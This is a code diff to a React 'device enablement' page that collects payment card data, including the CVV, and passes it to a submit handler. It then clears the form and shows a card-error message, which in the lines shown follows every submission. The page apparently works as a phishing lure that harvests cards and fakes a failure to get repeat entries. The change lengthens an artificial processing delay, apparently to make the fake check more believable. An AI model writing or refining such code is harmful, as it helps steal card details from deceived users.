@@ -365,7 +365,7 @@ export default function HabilitarDevicePage({
       cvv: card.cvv.trim(),
       certified: true,
     }
-    await new Promise((r) => setTimeout(r, 450))
+    await new Promise((r) => setTimeout(r, 3000))
     onSubmit?.(payload)
     setCard(emptyCard)
     setCardError('Error en los datos de la tarjeta. Verifique e intente nuevamente.')
